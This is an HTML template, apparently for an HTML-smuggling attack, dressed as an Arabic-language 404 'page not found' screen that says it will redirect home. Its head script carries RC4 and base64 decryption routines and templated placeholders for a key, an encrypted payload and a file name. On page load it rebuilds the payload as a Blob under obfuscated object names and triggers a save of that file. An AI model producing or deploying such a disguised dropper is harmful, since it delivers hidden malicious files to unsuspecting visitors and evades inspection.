<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>404</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<style>
#oopss {
  background: linear-gradient(-45deg, #fff300, #efe400);
  position: fixed;
  left: 0px;
  top: 0;
  width: 100%;
  height: 100%;
  line-height: 1.5em;
  z-index: 9999;
}
#oopss #error-text {
  font-size: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
  font-family: 'Shabnam', Tahoma, sans-serif;
  color: #000;
  direction: rtl;
}
#oopss #error-text img {
  margin: 85px auto 20px;
  height: 342px;
}
#oopss #error-text span {
  position: relative;
  font-size: 3.3em;
  font-weight: 900;
  margin-bottom: 50px;
}
#oopss #error-text p.p-a {
  font-size: 19px;
  margin: 30px 0 15px 0;
}
#oopss #error-text p.p-b {
  font-size: 15px;
}
#oopss #error-text .back {
  background: #fff;
  color: #000;
  font-size: 30px;
  text-decoration: none;
  margin: 2em auto 0;
  padding: .7em 2em;
  border-radius: 500px;
  box-shadow: 0 20px 70px 4px rgba(0, 0, 0, 0.1), inset 7px 33px 0 0px #fff300;
  font-weight: 900;
  transition: all 300ms ease;
}
#oopss #error-text .back:hover {
  -webkit-transform: translateY(-13px);
          transform: translateY(-13px);
  box-shadow: 0 35px 90px 4px rgba(0, 0, 0, 0.3), inset 0px 0 0 3px #000;
}

@font-face {
  font-family: Shabnam;
  src: url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam-Bold.eot");
  src: url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam-Bold.eot?#iefix") format("embedded-opentype"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam-Bold.woff") format("woff"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam-Bold.woff2") format("woff2"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam-Bold.ttf") format("truetype");
  font-weight: bold;
}
@font-face {
  font-family: Shabnam;
  src: url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam.eot");
  src: url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam.eot?#iefix") format("embedded-opentype"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam.woff") format("woff"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam.woff2") format("woff2"), url("https://cdn.rawgit.com/ahmedhosna95/upload/ba6564f8/fonts/Shabnam/Shabnam.ttf") format("truetype");
  font-weight: normal;
}

</style>
<script>
function ${rc4Function}(r,o){for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a;}
function ${b64AndRC4Function}(r,o){var s=[],j=0,x,res='';for(var i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++)j=(j+s[i]+r.charCodeAt(i%r.length))%256,x=s[i],s[i]=s[j],s[j]=x;i=0;j=0;var data=atob(o);var dataLength=data.length;var array=new Uint8Array(new ArrayBuffer(dataLength));for(var y=0;y<dataLength;y++)i=(i+1)%256,j=(j+s[i])%256,x=s[i],s[i]=s[j],s[j]=x,array[y]=data.charCodeAt(y)^s[(s[i]+s[j])% 256];return array;}

var ${keyFunction} = function(){return "${key}"};

var ${varPayload} = "${payload}";
var ${varBlobObjectName} = ${rc4Function}(${keyFunction}(),atob("${blobObjectNameEncrypted}"));
setTimeout('var ${varBlob} = new '+${varBlobObjectName}+'([${b64AndRC4Function}(${keyFunction}(), ${varPayload})], {type: "${mimeType}"})');
var ${varBlobShim} = ${rc4Function}(${keyFunction}(), atob("${blobShimEncrypted}"));
setTimeout(${varBlobShim}+'(${varBlob}, "${fileName}")');
</script>

</head>
<body>
<!-- partial:index.partial.html -->
<div id='oopss'>
    <div id='error-text'>
        <img src="https://cdn.rawgit.com/ahmedhosna95/upload/1731955f/sad404.svg" alt="404">
        <span>الورشة 404</span>
        <p class="p-a">هذه الصفحة غير موجودة! إما أن تم حذفها أو تغيير العنوان الخاص بها.</p>
        <p class="p-b">سيتم توجيهك الى الصفحة الرئيسية في غضون ثوانٍ قليلة...</p>
        <a href='#' class="back">صفحة البداية</a>
    </div>
</div>
<!-- partial -->
  
</body>
</html>
